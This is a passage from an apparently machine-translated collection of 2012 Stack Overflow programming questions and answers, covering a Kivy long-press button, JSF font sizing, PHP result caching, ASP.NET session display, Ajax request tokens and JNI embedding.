        self.register_event_type('on_time_slice')
        self.register_event_type('on_long_press')

    def on_touch_down(self, touch):
        start_time = time.time()
        self._touch_start = start_time
        self._touch_uid = touch.uid

        def callback(dt):
            self._check_long_press(dt)

        Clock.schedule_once(callback, self.long_press_interval / 1000.0)
        self._long_press_callback = callback
        super(TimedButton, self).on_touch_down(touch)

    def _check_long_press(self, dt):
        delta = dt * 1000
        if delta > self.long_press_interval and self._touch_uid is not None:
            self.dispatch('on_long_press')
            self._long_press_callback = None
            def slice_callback(dt):
                self.dispatch('on_time_slice')

            Clock.schedule_interval(slice_callback, self.time_slice / 1000.0)

            self._slice_callback = slice_callback

    def on_touch_up(self, touch):
        end_time = time.time()
        delta = (end_time - (self._touch_start or 0)) * 1000
        Clock.unschedule(self._slice_callback)
        if (self._long_press_callback is not None and
                delta > self.long_press_interval):
            self.dispatch('on_long_press')
        self._touch_start = self._touch_uid = None
        self._long_press_callback = self._slice_callback = None
        super(TimedButton, self).on_touch_up(touch)

    def on_long_press(self):
        pass

    def on_time_slice(self):
        pass 
```

`state`这是使用效果很好的新代码：

```
class TimedButton(Button):
    """A simple ``Button`` subclass that produces an event at regular intervals
    when pressed.

    This class, when long-pressed, emits an ``on_time_slice`` event every
    ``time_slice`` milliseconds.

    :param long_press_interval: Defines the minimum time required to consider
                                the press a long-press.
    :type long_press_interval: int
    :param time_slice: The number of milliseconds of each slice.
    :type time_slice: int
    """

    def __init__(self, long_press_interval=550, time_slice=225, **kwargs):
        super(TimedButton, self).__init__(**kwargs)

        self.long_press_interval = long_press_interval
        self.time_slice = time_slice

        self._touch_start = None
        self._long_press_callback = None
        self._slice_callback = None

        self.register_event_type('on_time_slice')
        self.register_event_type('on_long_press')

    def on_state(self, instance, value):
        if value == 'down':
            start_time = time.time()
            self._touch_start = start_time

            def callback(dt):
                self._check_long_press(dt)

            Clock.schedule_once(callback, self.long_press_interval / 1000.0)
            self._long_press_callback = callback
        else:
            end_time = time.time()
            delta = (end_time - (self._touch_start or 0)) * 1000
            Clock.unschedule(self._slice_callback)
            if (self._long_press_callback is not None and
                delta > self.long_press_interval):
                self.dispatch('on_long_press')
            self._touch_start = None
            self._long_press_callback = self._slice_callback = None

    def _check_long_press(self, dt):
        delta = dt * 1000
        if delta > self.long_press_interval and self.state == 'down':
            self.dispatch('on_long_press')
            self._long_press_callback = None

            def slice_callback(dt):
                self.dispatch('on_time_slice')
                return self.state == 'down'

            Clock.schedule_interval(slice_callback, self.time_slice / 1000.0)

            self._slice_callback = slice_callback

    def on_long_press(self):
        pass

    def on_time_slice(self):
        pass 
```

# jsf - 如何在 JSF 页面中更改字体大小

> ID：14074981
> 
> 赞同：1
> 
> 时间：2012-12-28T19:54:06.990
> 
> 标签：jsf, jsf-2

我有这个简单的 JSF 表，用于显示数据库中的数据以及编辑数据。

```
<table>
    <ui:repeat var="ud" value="#{DCProfileTabGeneralController.dcData}">

        <tr>
            <td>Datacenter Type</td>
            <td>
                <h:outputText value="#{ud.type}" 
                              rendered="#{not DCProfileTabGeneralController.editable}" />
                <h:inputText value="#{ud.type}" rendered="#{DCProfileTabGeneralController.editable}" />
            </td>                                    
        </tr>
        <tr>
            <td>Date Added</td>
            <td>
                <h:outputText value="#{ud.dateAdded}" 
                              rendered="#{not DCProfileTabGeneralController.editable}" />
                <h:inputText styleClass="datepicker" value="#{ud.dateAdded}" rendered="#{DCProfileTabGeneralController.editable}" />
            </td>                                    
        </tr>
        <tr>
            <td>Hour Added</td>
            <td>
                <h:outputText value="#{ud.hourAdded}" 
                              rendered="#{not DCProfileTabGeneralController.editable}" />
                <h:inputText value="#{ud.hourAdded}" rendered="#{DCProfileTabGeneralController.editable}" />
            </td>                                    
        </tr>
        <tr>
            <td>Date Deployed</td>
            <td>
                <h:outputText value="#{ud.dateDeployed}" 
                              rendered="#{not DCProfileTabGeneralController.editable}" />
                <h:inputText styleClass="datepicker" value="#{ud.dateDeployed}" rendered="#{DCProfileTabGeneralController.editable}" />
            </td>                                    
        </tr>
        <tr>
            <td>Hour Deployed</td>
            <td>
                <h:outputText value="#{ud.hourDeployed}" 
                              rendered="#{not DCProfileTabGeneralController.editable}" />
                <h:inputText value="#{ud.hourDeployed}" rendered="#{DCProfileTabGeneralController.editable}" />
            </td>                                    
        </tr>

    </ui:repeat>
</table> 
```

现在我想以这种方式扩展表格。当布尔标志为真时，我想以 12px 显示文本。当布尔标志为假时，我想以 20 像素显示文本。这在 JSF 中可能吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-28T21:14:27.653

您可以简单地使用 EL 表达式来设置适当的 CSS 样式：

```
<table id="idTable"
 style="font-size: #{DCProfileTabGeneralController.editable ? '12px' : '20px' }"> 
```

# php - PHP：持久变量值

> ID：14074989
> 
> 赞同：4
> 
> 时间：2012-12-28T19:54:39.470
> 
> 标签：php, static

我必须读取一个文件并进行一些计算，而不是将这个计算的结果保存在一个变量中。

我只需要这样做一次。在 Java + Servlet 中，我可以使用 servlet 容器来做到这一点，例如，单例模式。

我知道在 PHP 中我不能这样做。哪种方法更好？在数据库中保存计算（或传输数据）？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-28T21:05:21.467

不，它不会像 Java Servlet 那样工作。您必须找到解决方法。

首先，我假设使用 $_SESSION、$_COOKIE 或 $_REQUEST 通常对您来说是不切实际的，因为您希望保存每个服务器（或每个应用程序）而不是每个“用户会话”的状态。

在您的情况下，使用数据库听起来是可行的。在常规应用程序设计中，它将是最常见的解决方案。

您也可以使用 PHP 的序列化功能执行以下操作：

```
<?php

$resultfile = 'result.dat';
if(!file_exists($resultfile)) {
    $result = compute_result('foo bar');
    file_put_contents($resultfile, serialize($result));
} else {
    $result = unserialize(file_get_contents($resultfile));
} 
```

使用 PHP 的`serialize()`尝试尤其可行

*   您处于仅 PHP 的环境中
*   `$result`是一种复杂的数据类型，但您不想创建数据库结构并将 $result 也映射到它

如果您不在仅 PHP 的环境中，您可能更喜欢 JSON 或 XML 等其他序列化格式。

此外，序列化结果可以作为字符串存储在数据库中而不是文件中。将其保存到数据库而不是文件将使应用程序更具可扩展性，因为结果将可用于访问同一数据库（集群）的所有服务器。

简而言之：我建议将数据库与序列化结合使用。

# c# - 登录后如何在数据库中不存在时显示用户名？

> ID：14074992
> 
> 赞同：0
> 
> 时间：2012-12-28T19:54:49.710
> 
> 标签：c#, asp.net

在我的网站主页上有 2 个 div-div_login 和 div_welcome。默认登录 div 是可见的，欢迎 div 是隐藏的。当用户填写他/她的登录详细信息时，div_login 被隐藏并出现欢迎 div。我正在从网络服务中获取数据。在欢迎 div 上，我想给出用户的名字和姓氏，但如果用户在数据库中没有他的名字和姓氏，那么欢迎 div 会出现但会出错。请帮忙。网站链接是[这个][1]

代码：

```
 protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
            if (Session["myLogin"] != null && Session["Pwd"] != null)
            {
             Login_Div.Visible = false; 
             WelCome_Div.Visible = true; 
             lblFName.Text = Sessio["lblFName"].ToStrin(); 
             lblLName.Text = Session["lblLName"].ToString();
            }
            else
            {
                WelCome_Div.Visible = false; Login_Div.Visible = true;
            }
        }
    }

      [1]: https://www.starbazaarindia.com/test/index.aspx 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-28T20:28:46.990

尝试这个：

```
lblFName.Text = Session["lblFName"] != null ? Session["lblFName"].ToString();  
lblLName.Text = Session["lblLName"] != null ? Session["lblLName"].ToString(); 
```

# ajax - Ajax 安全性：如何确保发送回服务器的数据是由我的代码生成的？

> ID：14074994
> 
> 赞同：0
> 
> 时间：2012-12-28T19:54:51.963
> 
> 标签：ajax, web-services, security

如果这个问题对你来说听起来很幼稚，我提前道歉。问题是这样的：我有这个函数，我希望回调函数通过 Ajax 将“响应”发送回我的服务器。

```
function FbInviteFriends()
    {
    FB.ui({
    method: 'apprequests',
    message: 'Hi! Join me on XXXXXXX'
    },
    //My callback function
    function(response){
                 //Send response to my server
    } 
```

有没有办法检查我将在服务器端接收到的响应实际上与调用回调函数时得到的响应相同，并且用户没有在客户端修改响应？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T20:04:56.140

有几种方法，但所有方法都遵循相同的原则——你永远无法确定，所以请谨慎对待并验证。

也就是说，放置至少一个使用约束的一种方法可能如下所示：

*   访问的页面：生成令牌 GUID。在客户端渲染它。
*   将创建/使用的那一刻与用户配置文件一起存储在用户会话中。
*   客户端将令牌附加到所有 Ajax 帖子。
*   令牌在服务器上验证；必须匹配 SessionID、用户配置文件（如果有）和最大使用超时。

如果验证失败，则中止操作。

# java - 从 JNI 声明函数

> ID：14074998
> 
> 赞同：0
> 
> 时间：2012-12-28T19:55:25.020
> 
> 标签：java, jvm, java-native-interface

有什么方法可以在不创建 dll 的情况下从 jni 创建本机函数？我的意思是在 python [http://docs.python.org/2/extending/embedding.html](http://docs.python.org/2/extending/embedding.html) 第 5.4 节中。扩展嵌入式 Python

我不想使用 dll 导出的函数。

问候

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T22:49:31.240

您可以将 VM 嵌入到本机应用程序中，从 C/C++ 调用 Java，然后从 Java 回调回 C/C++。请参阅[JNI 文档中的调用 API](http://docs.oracle.com/javase/1.5.0/docs/guide/jni/spec/invocation.html#wp9502)。这样就不需要动态链接 (DLL)。您还可以通过使用本机方法（例如使用[ASM](http://asm.ow2.org/)）生成字节码，然后使用[RegisterNatives](http://docs.oracle.com/javase/1.5.0/docs/guide/jni/spec/functions.html#registering_native_methods)注册所需的任何 C/C++ 函数指针，在运行时动态生成类。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T20:18:12.887

从技术上讲是可能的。

大约 6 或 8 年前，我看到了一个 C++ 实现（它在 codeproject 站点上展示），它创建了一个 JVM 并确实访问了 Java 类。不是很受欢迎，有很好的理由，这里不胜枚举，但也是可能的。

我强烈建议做另一边，正是你不想要的：java调用dll左右，但有很多原因，但取决于你......

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-28T22:43:27.753

也许[JNA](https://github.com/twall/jna)做你想做的事？